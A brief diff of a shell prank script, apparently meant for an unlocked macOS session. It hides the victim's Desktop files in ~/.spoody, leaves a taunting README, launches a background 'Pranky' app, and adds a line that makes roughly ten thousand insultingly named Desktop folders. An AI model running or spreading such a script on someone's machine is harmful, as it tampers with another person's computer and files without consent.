@@ -7,6 +7,7 @@ tar -xvf /tmp/spoody/pranky.tar.gz -C /tmp/spoody > /dev/null
 mkdir ~/.spoody/
 echo "Lock your session the next time" > ~/.spoody/README
 mv ~/Desktop/* ~/.spoody/
+mkdir ~/Desktop/YouAintShit{00..10000}
 
 nohup open /tmp/spoody/app/Pranky.app > /dev/null
 
